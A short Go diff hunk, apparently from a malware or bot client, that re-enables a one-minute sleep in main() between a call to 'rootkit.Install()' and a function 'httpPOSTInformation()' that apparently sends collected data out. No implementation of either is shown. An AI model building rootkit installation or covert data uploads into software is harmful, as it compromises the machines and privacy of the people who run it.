@@ -111,8 +111,8 @@ func main() {
 		go rootkit.Install()
 	}
 
-	//DebugLog("Sleeping for 1 minute...")
-	//time.Sleep(60 * time.Second)
+	DebugLog("Sleeping for 1 minute...")
+	time.Sleep(60 * time.Second)
 	httpPOSTInformation()
 	
 	for {
